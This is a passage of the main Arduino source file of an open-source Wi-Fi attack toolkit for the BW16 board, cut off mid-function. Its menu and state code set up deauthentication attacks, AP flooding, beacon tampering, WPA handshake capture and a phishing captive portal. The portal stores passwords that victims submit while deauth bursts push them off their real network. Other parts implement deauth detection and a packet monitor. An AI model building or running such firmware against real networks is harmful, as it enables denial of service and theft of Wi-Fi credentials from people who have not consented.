/**
 * @file BW16-Tools.ino
 * @author FlyingIce
 * @brief BW16 WIFI Tools
 * @version 0.1
 * @date 2025-09-03
 * @link https://github.com/FlyingIceyyds/BW16-Tools
 */

//sdk
#include "SDK/WiFi.h"
#include "SDK/WiFiServer.h"
#include "SDK/WiFiClient.h"
#include "SDK/WiFi.cpp"
#include "SDK/WiFiClient.cpp"
#include "SDK/WiFiServer.cpp"
#include "SDK/WiFiSSLClient.cpp"
#include "SDK/WiFiUdp.cpp"

#include "wifi_conf.h"
#include "wifi_cust_tx.h"
void LinkJammer();
#include "wifi_util.h"
#include "wifi_structures.h"

#undef max
#undef min
#undef rand
#include <vector>
#include <set>
#include <utility>
#include "debug.h"
#include <Wire.h>
#include <algorithm>

// web
#include "WebPages/web_admin.h"
#include "WebPages/web_auth1.h"
#include "WebPages/web_auth2.h"
#include "web_config.h"
// Handshake capture module
#include "handshake.h"

// Fallback for FPSTR on cores that don't define it
#ifndef FPSTR
class __FlashStringHelper; // forward declaration for Arduino-style flash string helper
#define FPSTR(p) (reinterpret_cast<const __FlashStringHelper *>(p))
#endif

// DNSServer
#include "DNSServer.h"

// Display
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <U8g2_for_Adafruit_GFX.h>
U8G2_FOR_ADAFRUIT_GFX u8g2_for_adafruit_gfx;
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
// Face standby includes
#include "face/Common.h"
#include "face/Face.h"
#include "face/FaceEmotions.hpp"
// Force-include face sources so Arduino builder links them
#include "face/AsyncTimer.cpp"
#include "face/Eye.cpp"
#include "face/EyeBlink.cpp"
#include "face/EyeTransformation.cpp"
#include "face/EyeTransition.cpp"
#include "face/EyeVariation.cpp"
#include "face/BlinkAssistant.cpp"
#include "face/LookAssistant.cpp"
#include "face/FaceExpression.cpp"
#include "face/FaceBehavior.cpp"
#include "face/Face.cpp"

// Provide adapter instance for face module
U8g2Adapter u8g2;

// Standby face state
static bool g_standbyFaceActive = false;
static Face* g_face = nullptr;
static unsigned long g_faceLastRandomizeMs = 0;
static const unsigned long FACE_RANDOMIZE_INTERVAL_MS = 4000;

const int UI_RIGHT_GUTTER = 10; // （）
// （）
const int ANIM_STEPS = 6;       // （）
const int ANIM_DELAY_MS = 0;    // （）
// （）：，SSID
const int SELECT_MOVE_TOTAL_MS = 60;
// ： display.display（）
const int DISPLAY_FLUSH_EVERY_FRAMES = 2;
// （）
const int TITLE_FRAMES = 20;     // （<1s）
const int TITLE_DELAY_MS = 25;   // 
// （）
static bool g_skipNextSelectAnim = false;

// 
#define BTN_DOWN PA12
#define BTN_UP PA27
#define BTN_OK PA13
#define BTN_BACK PB2

// LED（BW16）
#ifndef LED_R
#define LED_R AMB_D12  // Red LED
#endif
#ifndef LED_G
#define LED_G AMB_D10  // Green LED
#endif
#ifndef LED_B
#define LED_B AMB_D11  // Blue LED
#endif

// ===== Web Test Forward Declarations =====
bool startWebTest();
void stopWebTest();
void handleWebTest();
void drawWebTestMain();
void drawWebTestInfo();
void drawWebTestPasswords();
void drawWebTestStatus();
void handleWebTestClient(WiFiClient& client);
void sendWebTestPage(WiFiClient& client);

// ===== UI Modal Forward Declaration =====
void showModalMessage(const String& line1, const String& line2 = String(""));
bool showConfirmModal(const String& line1,
                      const String& leftHint = String("《 Cancel"),
                      const String& rightHint = String("Confirm 》"));
bool showSelectSSIDConfirmModal();

// ===== Home Menu: unified registry and actions =====
typedef void (*HomeAction)();
struct HomeMenuItem {
  const char* label;
  HomeAction action;
};

// Forward declarations for home actions (handlers)
void homeActionSelectSSID();
void homeActionAttackMenu();
void homeActionQuickScan();
void homeActionPhishing();
void homeActionConnInterfere();
void homeActionBeaconTamper();
void homeActionApFlood();
void homeActionAttackDetect();
void homeActionPacketMonitor();
void homeActionDeepScan();
void homeActionWebUI();
void homeActionQuickCapture();

// VARIABLES
typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];

  short rssi;
  uint channel;
  int security_type;
} WiFiScanResult;

// ===== Handshake WebUI State =====
extern bool hs_sniffer_running;
static WiFiScanResult hs_selected_network = {};
static bool hs_has_selection = false;

// SelectedAP defined in handshake.h
SelectedAP _selectedNetwork;

// Provide AP_Channel compatible getter used by handshake.h
String AP_Channel = String(0);

// static String bytesToStr(const uint8_t* mac, int len) { // 
//   char buf[3*6];
//   int n = 0; for (int i=0;i<len;i++){ n += snprintf(buf+n, sizeof(buf)-n, i==len-1?"%02X":"%02X:", mac[i]); }
//   return String(buf);
// }

// Credentials for you Wifi network
char *ssid = "";
char *pass = "";
int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};
// ：0=, 1=5G, 2=2.4G
int beaconBandMode = 0;

// ===== URL/HTTP helpers =====
// application/x-www-form-urlencoded （UTF-8）
/**
 * @brief Decode percent-encoded application/x-www-form-urlencoded text.
 *
 * Replaces '+' with space and decodes %HH sequences as raw UTF-8 bytes.
 * Invalid sequences are preserved as-is.
 *
 * @param input Input string to decode.
 * @return Decoded string.
 */
static String urlDecode(const String& input) {
  String out;
  out.reserve(input.length());
  for (size_t i = 0; i < (size_t)input.length(); i++) {
    char c = input[(int)i];
    if (c == '+') {
      out += ' ';
    } else if (c == '%' && i + 2 < (size_t)input.length()) {
      char h1 = input[(int)i + 1];
      char h2 = input[(int)i + 2];
      auto hexVal = [](char ch) -> int {
        if (ch >= '0' && ch <= '9') return ch - '0';
        if (ch >= 'A' && ch <= 'F') return ch - 'A' + 10;
        if (ch >= 'a' && ch <= 'f') return ch - 'a' + 10;
        return -1;
      };
      int v1 = hexVal(h1);
      int v2 = hexVal(h2);
      if (v1 >= 0 && v2 >= 0) {
        char decoded = (char)((v1 << 4) | v2);
        out += decoded;
        i += 2;
      } else {
        // ，
        out += c;
      }
    } else {
      out += c;
    }
  }
  return out;
}

// UTF-8maxBytes（）
/**
 * @brief Truncate a UTF-8 string by byte length without splitting multibyte chars.
 *
 * @param input Source UTF-8 string.
 * @param maxBytes Maximum number of bytes allowed in the result.
 * @return Truncated string not exceeding maxBytes.
 */
static String utf8TruncateByBytes(const String& input, int maxBytes) {
  if (maxBytes <= 0) return String("");
  const char* s = input.c_str();
  int len = (int)strlen(s);
  if (len <= maxBytes) return input;
  int bytes = 0;
  int lastSafe = 0;
  for (int i = 0; i < len; ) {
    unsigned char c = (unsigned char)s[i];
    int charLen = 1;
    if ((c & 0x80) == 0x00) {
      charLen = 1; // 0xxxxxxx
    } else if ((c & 0xE0) == 0xC0) {
      charLen = 2; // 110xxxxx
    } else if ((c & 0xF0) == 0xE0) {
      charLen = 3; // 1110xxxx
    } else if ((c & 0xF8) == 0xF0) {
      charLen = 4; // 11110xxx
    } else {
      // ，，
      charLen = 1;
    }
    if (bytes + charLen > maxBytes) break;
    bytes += charLen;
    lastSafe = i + charLen;
    i += charLen;
  }
  String out;
  out.reserve(bytes);
  for (int i = 0; i < lastSafe; i++) out += s[i];
  return out;
}

static inline bool is24GChannel(int ch) {
  return ch >= 1 && ch <= 14;
}

 

static inline bool is5GChannel(int ch) {
  return ch >= 36; // ：5G36
}

bool BeaconBandMenu();
void StableBeacon();
int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
std::vector<int> SelectedVector;
// ： scan_results ，0 / 1 （ O(1) ）
std::vector<uint8_t> selectedFlags;
// ，
// bool deauth_running = false;
// deauth_bssid ，
uint8_t becaon_bssid[6];
// SSID
// String SelectedSSID;
// String SSIDCh;
// （），
// unsigned long SCROLL_DELAY = 300; // 
int attackstate = 0;
int menustate = 0;
int deauthstate = 0; 
int scrollindex = 0;
int perdeauth = 10;  // 
int num = 0; // 

// （）
int homeStartIndex = 0;
// （attackstate）
int homeState = 0; // 0，

// Unified registry: add new items here only (main menu)
static const HomeMenuItem g_homeMenuItems[] = {
  {"Select AP/SSID",            homeActionSelectSSID},
  {"Attack Menu",       homeActionAttackMenu},
  {"Quick Scan",         homeActionQuickScan},
  {"Phishing",     homeActionPhishing},
  {"Conn Interfere",      homeActionConnInterfere},
  {"Beacon Tamper",           homeActionBeaconTamper},
  {"AP Flood [DoS]",        homeActionApFlood},
  {"Attack Detect",     homeActionAttackDetect},
  {"Packet Monitor",        homeActionPacketMonitor},
  {"Deep Scan",      homeActionDeepScan},
  {"Quick Capture",      homeActionQuickCapture},
  {"Start Web UI",           homeActionWebUI}
};
static const int g_homeMenuCount = (int)(sizeof(g_homeMenuItems) / sizeof(g_homeMenuItems[0]));
static inline int getHomeMaxItems() { return g_homeMenuCount; }
#define HOME_MAX_ITEMS (getHomeMaxItems())

const int HOME_PAGE_SIZE = 3;
const int HOME_ITEM_HEIGHT = 20; // 
const int HOME_Y_OFFSET = 2;
const int HOME_RECT_HEIGHT = 18; // 

// Web UI
bool web_ui_active = false;
bool web_test_active = false;
bool web_server_active = false;
bool dns_server_active = false;
// Handshake sniffer running flag (used by WebUI and handshake.h)
bool hs_sniffer_running = false;

// 
bool quick_capture_active = false;
bool quick_capture_completed = false;
int quick_capture_mode = 0; // 0=, 1=, 2=
unsigned long quick_capture_start_time = 0;

// ============ ============
// 
enum AttackMode {
  ATTACK_IDLE = 0,
  ATTACK_SINGLE,
  ATTACK_MULTI,
  ATTACK_AUTO_SINGLE,
  ATTACK_AUTO_MULTI,
  ATTACK_ALL,
  ATTACK_BEACON_DEAUTH
};

// 
struct DeauthAttackState {
  AttackMode mode;
  bool running;
  
  // 
  unsigned long lastPacketMs;
  unsigned long lastUIUpdateMs;
  unsigned long lastButtonCheckMs;
  unsigned long lastLEDToggleMs;
  unsigned long lastScanMs;
  
  // 
  size_t currentTargetIndex;
  size_t currentChannelBucketIndex;
  size_t currentBssidIndexInBucket;
  
  // 
  int packetCount;
  bool ledState;
  
  // 
  unsigned int packetsPerCycle;
  unsigned int uiUpdateInterval;
  unsigned int buttonCheckInterval;
  unsigned int ledBlinkInterval;
  
  // 
  int lastChannel;
  bool channelSet;
};

// 
DeauthAttackState g_deauthState = {
  .mode = ATTACK_IDLE,
  .running = false,
  .lastPacketMs = 0,
  .lastUIUpdateMs = 0,
  .lastButtonCheckMs = 0,
  .lastLEDToggleMs = 0,
  .lastScanMs = 0,
  .currentTargetIndex = 0,
  .currentChannelBucketIndex = 0,
  .currentBssidIndexInBucket = 0,
  .packetCount = 0,
  .ledState = false,
  .packetsPerCycle = 10,
  .uiUpdateInterval = 500,
  .buttonCheckInterval = 100,
  .ledBlinkInterval = 500,
  .lastChannel = -1,
  .channelSet = false
};
unsigned long quick_capture_end_time = 0;

// ：，
bool g_webTestLocked = false;
// WebUI：AP，
bool g_webUILocked = false;
//：DNSServer，

DNSServer dnsServer;
WiFiServer web_server(WEB_SERVER_PORT);
WiFiClient web_client;
unsigned long last_web_check = 0;
const unsigned long WEB_CHECK_INTERVAL = 100; // Web

// Web Test （SSID）
String web_test_ssid_dynamic = WEB_TEST_SSID;
int web_test_channel_dynamic = WEB_TEST_CHANNEL;
// Web Test 
std::vector<String> web_test_submitted_texts;
static int webtest_password_scroll = 0;
static int webtest_password_cursor = 0;
// Web Test OLED ：0=，1=，2=，3=
static int webtest_ui_page = 0;
// ，
static bool webtest_border_always_on = false;
static int webtest_flash_remaining_toggles = 0; // 4 toggles = 
static unsigned long webtest_last_flash_toggle_ms = 0;
static bool webtest_border_flash_visible = true;
	// ：BSSIDDeauth
	static bool phishingHasTarget = false;
	static uint8_t phishingTargetBSSID[6] = {0};
	static unsigned long lastPhishingDeauthMs = 0;
	static unsigned long lastPhishingBroadcastMs = 0;
	static int phishingDeauthInterval = 500; // ：
	static int phishingBatchSize = 10; // ：

// 
static bool detect_border_always_on = false;
static int detect_flash_remaining_toggles = 0; // 4 toggles = 
static unsigned long detect_last_flash_toggle_ms = 0;
static bool detect_border_flash_visible = true;

// ============ （/） ============
#if defined(ARDUINO_AMEBAD) || defined(BOARD_RTL872X) || defined(AMEBAD)
extern "C" {
#include "wifi_conf.h"
}
#endif
static volatile unsigned long g_detectDeauthCount = 0;
static volatile unsigned long g_detectDisassocCount = 0;
static bool g_attackDetectRunning = false;
static unsigned long g_attackDetectLastDrawMs = 0;
static unsigned long g_attackDetectLastChSwitchMs = 0;
static int g_attackDetectChIndex = 0; // 
static uint8_t g_localMacForDetect[6] = {0};
static volatile uint8_t g_lastDetectSrc[6] = {0};
static volatile uint8_t g_lastDetectKind = 0; // 0xC0 deauth, 0xA0 disassoc
static unsigned long g_lastDetectLogMs = 0;
static volatile uint16_t g_lastReason = 0;

// 
static bool g_packetDetectRunning = false;
static unsigned long g_packetDetectLastDrawMs = 0;
static volatile unsigned long g_packetCount = 0; // 
static unsigned long g_packetCountLastReset = 0; // 
static int g_packetDetectChannel = 1; // 
static unsigned long g_packetDetectStartTime = 0; // 
static unsigned long g_packetDetectLastChannelSwitch = 0; // 
static volatile unsigned long g_packetDetectTotalPackets = 0; // 
static unsigned long g_packetDetectHistory[64] = {0}; // （）
static int g_packetDetectHistoryIndex = 0; // 

// UI
static bool g_showDownIndicator = false; // 
static bool g_showUpIndicator = false;   // 

// 
static bool g_showMgmtFrameIndicator = false; // 
static unsigned long g_mgmtFrameIndicatorStartTime = 0; // 
static const unsigned long MGMT_FRAME_INDICATOR_TIME = 1000; // （）

// 2.4G5G
static const int channels24G[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14};
static const int channels5G[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};
static const int channels24GCount = sizeof(channels24G) / sizeof(channels24G[0]);
static const int channels5GCount = sizeof(channels5G) / sizeof(channels5G[0]);

// 
static int g_currentChannelListIndex = 0;
static bool g_using24G = true; // true=2.4G, false=5G

// 
static bool g_upKeyPressed = false;
static bool g_downKeyPressed = false;
static unsigned long g_upKeyPressTime = 0;
static unsigned long g_downKeyPressTime = 0;
static const unsigned long KEY_DEBOUNCE_MS = 50; // 

// 
static bool g_channelPreviewMode = false;
static int g_previewChannel = 1;
static bool g_usingPreview24G = true;
static int g_previewChannelListIndex = 0;
static unsigned long g_lastPreviewSwitchTime = 0; // 
static bool g_previewSwitchPending = false; // 

// 
enum ChannelGroupType {
  CHANNEL_GROUP_24G_5G_COMMON = 0,  // 2.4G+5G（）
  CHANNEL_GROUP_24G_ALL = 1,        // 2.4G
  CHANNEL_GROUP_5G_ALL = 2,         // 5G
  CHANNEL_GROUP_24G_5G_ALL = 3,     // 2.4G+5G
  CHANNEL_GROUP_COUNT
};

static int g_currentChannelGroup = CHANNEL_GROUP_24G_5G_COMMON; // 

// 2.4G
static const uint8_t detectChannels24GAll[] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14};

// 5G
static const uint8_t detectChannels5GAll[] = {36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,144,149,153,157,161,165};

// 2.4G+5G（）
static const uint8_t detectChannels24G5GCommon[] = {1,6,11,3,8,13,36,40,44,48,149,153,157,161,165};

// 2.4G+5G
static const uint8_t detectChannels24G5GAll[] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,144,149,153,157,161,165};

// 
static const uint8_t* getCurrentChannelGroup(int& count) {
  switch (g_currentChannelGroup) {
    case CHANNEL_GROUP_24G_ALL:
      count = sizeof(detectChannels24GAll) / sizeof(detectChannels24GAll[0]);
      return detectChannels24GAll;
    case CHANNEL_GROUP_5G_ALL:
      count = sizeof(detectChannels5GAll) / sizeof(detectChannels5GAll[0]);
      return detectChannels5GAll;
    case CHANNEL_GROUP_24G_5G_COMMON:
      count = sizeof(detectChannels24G5GCommon) / sizeof(detectChannels24G5GCommon[0]);
      return detectChannels24G5GCommon;
    case CHANNEL_GROUP_24G_5G_ALL:
      count = sizeof(detectChannels24G5GAll) / sizeof(detectChannels24G5GAll[0]);
      return detectChannels24G5GAll;
    default:
      count = sizeof(detectChannels24G5GCommon) / sizeof(detectChannels24G5GCommon[0]);
      return detectChannels24G5GCommon;
  }
}

// 
static String getCurrentChannelGroupName() {
  switch (g_currentChannelGroup) {
    case CHANNEL_GROUP_24G_ALL:
      return "All 2.4G Ch";
    case CHANNEL_GROUP_5G_ALL:
      return "All 5G Ch";
    case CHANNEL_GROUP_24G_5G_COMMON:
      return "Common Dual";
    case CHANNEL_GROUP_24G_5G_ALL:
      return "All Dual Band";
    default:
      return "Common Dual";
  }
}

// 
static String getCurrentChannelGroupShortName() {
  switch (g_currentChannelGroup) {
    case CHANNEL_GROUP_24G_ALL:
      return "2.4G";
    case CHANNEL_GROUP_5G_ALL:
      return "5G";
    case CHANNEL_GROUP_24G_5G_COMMON:
      return "Common";
    case CHANNEL_GROUP_24G_5G_ALL:
      return "All";
    default:
      return "Common";
  }
}

// 
static void switchToNextChannelGroup() {
  g_currentChannelGroup = (g_currentChannelGroup + 1) % CHANNEL_GROUP_COUNT;
  g_attackDetectChIndex = 0; // 
  
  // 
  int count;
  const uint8_t* channels = getCurrentChannelGroup(count);
  if (count > 0) {
    wext_set_channel(WLAN0_NAME, channels[0]);
    Serial.print("[Detect] Switched to channel group: "); 
    Serial.print(getCurrentChannelGroupName());
    Serial.print(" (first channel: "); Serial.print(channels[0]); Serial.println(")");
  }
}



// BW16/RTL8720DN: 2.4GHz （）
static const uint8_t detectChannels24G[] = {1,2,3,4,5,6,7,8,9,10,11,12,13};
static volatile unsigned long g_promiscCbHits = 0;
static volatile unsigned long g_mgmtFramesSeen = 0;
static volatile uint32_t g_subtypeHistogram[16] = {0};
static unsigned long g_detectStickyUntilMs = 0; // 
// ：→
struct DetectEvent { uint8_t mac[6]; uint8_t kind; unsigned long ts; };
static volatile unsigned int g_evHead = 0, g_evTail = 0;
static DetectEvent g_evBuf[64];
// 
struct SuspectRecord {
  uint8_t bssid[6];
  unsigned long deauthCount;
  unsigned long disassocCount;
  unsigned long lastSeenMs;
};
static std::vector<SuspectRecord> g_suspects;
static unsigned long g_totalDeauth = 0;
static unsigned long g_totalDisassoc = 0;
// UI 
static int g_detectUiMode = 0; // 0=,1=,2=
static int g_recordsPage = 0;
// （""）
struct TempCount { uint8_t bssid[6]; unsigned int d; unsigned int a; };
static std::vector<TempCount> g_tempCounts;

#if defined(ARDUINO_AMEBAD) || defined(BOARD_RTL872X) || defined(AMEBAD)
extern "C" {
  int wifi_set_mgnt_rxfilter(uint8_t enable);
  typedef struct { uint8_t filter_mode; } promisc_filter_t;
  #ifndef PROMISC_FILTER_MASK_MGMT
  #define PROMISC_FILTER_MASK_MGMT 0x01
  #endif
  int wifi_set_promisc_filter(promisc_filter_t *f);
  int wifi_set_promisc_filter_reason(uint8_t enable);
}
#endif

// ：AmebaD wifi_set_promisc(RTW_PROMISC_ENABLE/DISABLE,...)

// 802.11，Deauth/Disassoc
static void promiscDetectCallback(unsigned char *buf, unsigned int len, void *userdata) {
  (void)userdata;
  if (!buf || len < 24) {
    // ：
    static unsigned long lastShortFrameLog = 0;
    if (millis() - lastShortFrameLog > 5000) {
      Serial.print("[Detect] Short frame received: len="); Serial.println(len);
      lastShortFrameLog = millis();
    }
    return;
  }
  
  g_promiscCbHits++;
  
  // ：
  static unsigned long lastFrameLog = 0;
  if (millis() - lastFrameLog > 10000) {
    Serial.print("[Detect] Frame received: len="); Serial.print(len);
    Serial.print(" buf[0]="); Serial.print(buf[0], HEX);
    Serial.print(" buf[1]="); Serial.println(buf[1], HEX);
    lastFrameLog = millis();
  }
  
  // SDK：0,4,8,24,32,36,40（）
  const int tryOffsets[] = {0, 4, 8, 24, 32, 36, 40};
  for (size_t t = 0; t < sizeof(tryOffsets)/sizeof(tryOffsets[0]); t++) {
    int off = tryOffsets[t];
    if (len < (unsigned)(off + 24)) continue;
    const uint8_t *base = buf + off;
    uint16_t fc = (uint16_t)base[0] | ((uint16_t)base[1] << 8);
    uint8_t type = (fc >> 2) & 0x3;
    uint8_t subtype = (fc >> 4) & 0xF;
    
    // 
    if (type == 0) {
      g_mgmtFramesSeen++;
      if (subtype < 16) g_subtypeHistogram[subtype]++;
      
      // ：
      static unsigned long lastMgmtLog = 0;
      if (millis() - lastMgmtLog > 5000) {
        Serial.print("[Detect] Management frame: type="); Serial.print(type);
        Serial.print(" subtype="); Serial.print(subtype);
        Serial.print(" fc=0x"); Serial.println(fc, HEX);
        lastMgmtLog = millis();
      }
    }
    
    if (type != 0) continue; // 
    bool isDeauth = (subtype == 12);
    bool isDisassoc = (subtype == 10);
    if (!isDeauth && !isDisassoc) continue;
    
    const uint8_t *src = base + 10; // 2
    bool fromSelf = true;
    for (int i = 0; i < 6; i++) { if (src[i] != g_localMacForDetect[i]) { fromSelf = false; break; } }
    if (fromSelf) return; // 
    
    // 
    Serial.print("[Detect] Attack frame detected: ");
    Serial.print(isDeauth ? "Deauth" : "Disassoc");
    Serial.print(" from ");
    for (int i = 0; i < 6; i++) { Serial.print(src[i], HEX); if (i<5) Serial.print(":"); }
    Serial.println();
    
    // （）
    g_showMgmtFrameIndicator = true;
    g_mgmtFrameIndicatorStartTime = millis();
    
    // 
    unsigned int nh = (g_evHead + 1) & 63;
    if (nh != g_evTail) {
      for (int i = 0; i < 6; i++) g_evBuf[g_evHead].mac[i] = src[i];
      g_evBuf[g_evHead].kind = isDeauth ? 0xC0 : 0xA0;
      g_evBuf[g_evHead].ts = millis();
      g_evHead = nh;
    }
    // ""
    int tIdx = -1; for (size_t j = 0; j < g_tempCounts.size(); j++) { bool eq=true; for(int k=0;k<6;k++) if (g_tempCounts[j].bssid[k]!=src[k]) {eq=false;break;} if(eq){tIdx=(int)j;break;} }
    if (tIdx == -1) { TempCount tc; memcpy(tc.bssid, src, 6); tc.d = isDeauth?1:0; tc.a = isDisassoc?1:0; g_tempCounts.push_back(tc); }
    else { if (isDeauth) g_tempCounts[tIdx].d++; if (isDisassoc) g_tempCounts[tIdx].a++; }
    // OLED
    if (isDeauth) { g_lastDetectKind = 0xC0; } else { g_lastDetectKind = 0xA0; }
    for (int i = 0; i < 6; i++) g_lastDetectSrc[i] = src[i];
    if (len >= (unsigned)(off + 26)) { uint16_t r; memcpy(&r, base + 24, sizeof(r)); g_lastReason = r; }
    // ， 3 ，
    g_detectStickyUntilMs = millis() + 3000;
    return;
  }
}

// ：
static void promiscPacketDetectCallback(unsigned char *buf, unsigned int len, void *userdata) {
  (void)userdata;
  if (!buf || len < 10) { // ，
    return;
  }
  
  // （）
  g_packetCount++;
  g_packetDetectTotalPackets++;
  
  // （）
  if (len >= 24) {
    // SDK：0,4,8,24,32,36,40（）
    const int tryOffsets[] = {0, 4, 8, 24, 32, 36, 40};
    for (size_t t = 0; t < sizeof(tryOffsets)/sizeof(tryOffsets[0]); t++) {
      int off = tryOffsets[t];
      if (len < (unsigned)(off + 24)) continue;
      const uint8_t *base = buf + off;
      uint16_t fc = (uint16_t)base[0] | ((uint16_t)base[1] << 8);
      uint8_t type = (fc >> 2) & 0x3;
      uint8_t subtype = (fc >> 4) & 0xF;
      
      
      // （subtype=12）（subtype=10）
      if (type == 0) { // 
        bool isDeauth = (subtype == 12);
        bool isDisassoc = (subtype == 10);
        if (isDeauth || isDisassoc) {
          // 
          g_showMgmtFrameIndicator = true;
          g_mgmtFrameIndicatorStartTime = millis();
          Serial.print("[PacketDetect] Attack frame detected: ");
          Serial.print(isDeauth ? "Deauth" : "Disassoc");
          Serial.print(" subtype="); Serial.println(subtype);
          break; // 
        }
      }
    }
  }
}

// 
static void startPacketDetection() {
  g_packetCount = 0;
  g_packetDetectTotalPackets = 0;
  g_packetDetectRunning = true;
  g_packetDetectStartTime = millis();
  g_packetDetectLastChannelSwitch = millis();
  g_packetCountLastReset = millis();
  
  // 
  g_currentChannelListIndex = 0;
  g_using24G = true;
  g_packetDetectChannel = channels24G[0]; // 2.4G1
  
  // 
  for (int i = 0; i < 64; i++) {
    g_packetDetectHistory[i] = 0;
  }
  g_packetDetectHistoryIndex = 0;
  
  Serial.println("[PacketDetect] Starting packet detection...");
  Serial.print("[PacketDetect] Initial channel: "); Serial.println(g_packetDetectChannel);
  
  // 
  wext_set_channel(WLAN0_NAME, g_packetDetectChannel);
  
  // 
  WiFi.disablePowerSave();
  
  #if defined(ARDUINO_AMEBAD) || defined(BOARD_RTL872X) || defined(AMEBAD)
  {
    // ，
    Serial.println("[PacketDetect] No filter set - monitoring all packet types");
    
    int rcR = wifi_set_promisc_filter_reason(0); // 
    Serial.print("[PacketDetect] wifi_set_promisc_filter_reason(0) rc="); Serial.println(rcR);
    
    int rc = wifi_set_mgnt_rxfilter(0); // 
    Serial.print("[PacketDetect] wifi_set_mgnt_rxfilter(0) rc="); Serial.println(rc);
  }
  #endif
  
  // 
  int rc = wifi_set_promisc(RTW_PROMISC_ENABLE_2, promiscPacketDetectCallback, 1);
  Serial.print("[PacketDetect] wifi_set_promisc(RTW_PROMISC_ENABLE_2, len=1) rc="); Serial.println(rc);
  
  if (rc != 0) {
    Serial.println("[PacketDetect] RTW_PROMISC_ENABLE_2 failed, trying RTW_PROMISC_ENABLE");
    rc = wifi_set_promisc(RTW_PROMISC_ENABLE, promiscPacketDetectCallback, 1);
    Serial.print("[PacketDetect] wifi_set_promisc(RTW_PROMISC_ENABLE, len=1) rc="); Serial.println(rc);
  }
}

// 
static void stopPacketDetection() {
  Serial.println("[PacketDetect] Stopping packet detection...");
  
  // 
  #if defined(RTW_PROMISC_DISABLE)
  {
    int rc = wifi_set_promisc(RTW_PROMISC_DISABLE, nullptr, 0);
    Serial.print("[PacketDetect] wifi_set_promisc(DISABLE) rc="); Serial.println(rc);
  }
  #endif
  
  // 
  #if defined(ARDUINO_AMEBAD) || defined(BOARD_RTL872X) || defined(AMEBAD)
  {
    int rc = wifi_set_mgnt_rxfilter(0);
    Serial.print("[PacketDetect] wifi_set_mgnt_rxfilter(0) rc="); Serial.println(rc);
  }
  #endif
  
  // 
  g_packetDetectRunning = false;
  g_packetDetectLastDrawMs = 0;
  g_packetDetectLastChannelSwitch = 0;
  g_packetCount = 0;
  g_packetDetectTotalPackets = 0;
  
  // 
  g_upKeyPressed = false;
  g_downKeyPressed = false;
  g_upKeyPressTime = 0;
  g_downKeyPressTime = 0;
  
  // 
  g_channelPreviewMode = false;
  g_previewChannel = 1;
  g_usingPreview24G = true;
  g_previewChannelListIndex = 0;
  g_lastPreviewSwitchTime = 0;
  g_previewSwitchPending = false;
  
  // 
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  
  Serial.println("[PacketDetect] Packet detection stopped and resources cleaned up");
}

// 
static void switchToNextPacketDetectChannel() {
  if (g_using24G) {
    g_currentChannelListIndex++;
    if (g_currentChannelListIndex >= channels24GCount) {
      // 5G
      g_using24G = false;
      g_currentChannelListIndex = 0;
    }
  } else {
    g_currentChannelListIndex++;
    if (g_currentChannelListIndex >= channels5GCount) {
      // 2.4G
      g_using24G = true;
      g_currentChannelListIndex = 0;
    }
  }
  
  g_packetDetectChannel = g_using24G ? channels24G[g_currentChannelListIndex] : channels5G[g_currentChannelListIndex];
  
  wext_set_channel(WLAN0_NAME, g_packetDetectChannel);
  g_packetDetectLastChannelSwitch = millis();
  g_packetCount = 0; // 
  
  Serial.print("[PacketDetect] Switched to channel: "); Serial.println(g_packetDetectChannel);
}

// 
static void switchToPrevPacketDetectChannel() {
  if (g_using24G) {
    g_currentChannelListIndex--;
    if (g_currentChannelListIndex < 0) {
      // 5G
      g_using24G = false;
      g_currentChannelListIndex = channels5GCount - 1;
    }
  } else {
    g_currentChannelListIndex--;
    if (g_currentChannelListIndex < 0) {
      // 2.4G
      g_using24G = true;
      g_currentChannelListIndex = channels24GCount - 1;
    }
  }
  
  g_packetDetectChannel = g_using24G ? channels24G[g_currentChannelListIndex] : channels5G[g_currentChannelListIndex];
  
  wext_set_channel(WLAN0_NAME, g_packetDetectChannel);
  g_packetDetectLastChannelSwitch = millis();
  g_packetCount = 0; // 
  
  Serial.print("[PacketDetect] Switched to channel: "); Serial.println(g_packetDetectChannel);
}

// （）
static void previewNextChannel() {
  if (g_usingPreview24G) {
    g_previewChannelListIndex++;
    if (g_previewChannelListIndex >= channels24GCount) {
      // 5G
      g_usingPreview24G = false;
      g_previewChannelListIndex = 0;
    }
  } else {
    g_previewChannelListIndex++;
    if (g_previewChannelListIndex >= channels5GCount) {
      // 2.4G
      g_usingPreview24G = true;
      g_previewChannelListIndex = 0;
    }
  }
  
  g_previewChannel = g_usingPreview24G ? channels24G[g_previewChannelListIndex] : channels5G[g_previewChannelListIndex];
}
// （）
static void previewPrevChannel() {
  if (g_usingPreview24G) {
    g_previewChannelListIndex--;
    if (g_previewChannelListIndex < 0) {
      // 5G
      g_usingPreview24G = false;
      g_previewChannelListIndex = channels5GCount - 1;
    }
  } else {
    g_previewChannelListIndex--;
    if (g_previewChannelListIndex < 0) {
      // 2.4G
      g_usingPreview24G = true;
      g_previewChannelListIndex = channels24GCount - 1;
    }
  }
  
  g_previewChannel = g_usingPreview24G ? channels24G[g_previewChannelListIndex] : channels5G[g_previewChannelListIndex];
}

// （）
static void applyPreviewChannel() {
  g_packetDetectChannel = g_previewChannel;
  g_using24G = g_usingPreview24G;
  g_currentChannelListIndex = g_previewChannelListIndex;
  
  wext_set_channel(WLAN0_NAME, g_packetDetectChannel);
  g_packetDetectLastChannelSwitch = millis();
  g_packetCount = 0; // 
  
